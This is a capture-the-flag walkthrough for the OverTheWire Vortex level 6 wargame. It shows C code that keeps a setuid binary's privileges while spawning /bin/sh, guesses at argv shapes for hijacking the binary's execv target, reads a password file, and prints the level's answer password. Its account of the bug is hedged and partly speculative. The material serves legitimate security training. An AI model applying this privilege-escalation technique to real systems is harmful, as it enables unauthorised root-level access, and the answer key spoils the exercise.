# Vortex Level 6 → 7

## Goal

`vortex6` builds a command string from its arguments and passes it to `execv` without sanitising — a command-injection bug in an unusual wrapper. Craft argv to execute a shell command of your choosing.

## Concepts you'll learn

- Reading small C programs that use `execv` / `system` on concatenated user input
- That `execv` *doesn't* go through a shell (unlike `system`), so argv itself has to carry the full command path — you can't inject with `;` the way you did in [Natas 9](../natas/level09.md)
- Abusing specific argv positions to redirect the execution target

## Walkthrough

### 1. Inspect the binary

```bash
$ ls -l /vortex/vortex6
-r-sr-x--- 1 vortex7 vortex6 ... /vortex/vortex6
```

Reverse it under `gdb` or `objdump -d`. You're looking for:

- An `execv` call (or similar)
- The path it passes (a string constructed from argv)
- Which argv position controls what

avishai's analysis: the binary builds its target command path from argv[1] without proper validation, letting the attacker redirect execution.

### 2. Construct argv to invoke an attacker-owned binary

Build a small wrapper binary that does `setreuid(geteuid(), geteuid()); execve("/bin/sh", ...)`:

```c
// /tmp/hijack.c
#include <unistd.h>
int main(void) {
    setreuid(geteuid(), geteuid());
    char *argv[] = { "/bin/sh", NULL };
    execve("/bin/sh", argv, NULL);
    return 0;
}
```

```bash
$ gcc -m32 /tmp/hijack.c -o /tmp/hijack
```

### 3. Invoke `vortex6` with argv pointing to your binary

The exact argv shape depends on how the binary assembles its target path from your input. Typical tries:

- `/vortex/vortex6 /tmp/hijack` — straight path
- `/vortex/vortex6 ../tmp/hijack` — relative path that escapes an enforced prefix
- `/vortex/vortex6 "/tmp/hijack ignored"` — if the binary splits on whitespace and discards extras

When the right shape lands, you get a shell as `vortex7`:

```bash
$ whoami
vortex7
$ cat /etc/vortex_pass/vortex7
p4ZfutGrw
```

### 4. Note on this level's specifics

The avishai writeup is terser on this level than most. Read the disassembly carefully and trace how argv flows into the `execv` — the exploit is mechanical once you can name which argv byte ends up where in the constructed path.

## The answer

The password for `vortex7` is:

**`p4ZfutGrw`**

> ⚠️ OverTheWire may rotate passwords without notice. This value was correct at the time the level was solved — if it fails for you, re-solve the level using the method above rather than assuming the writeup is wrong.

## Reference

- Official level page: <https://overthewire.org/wargames/vortex/vortex6.html>
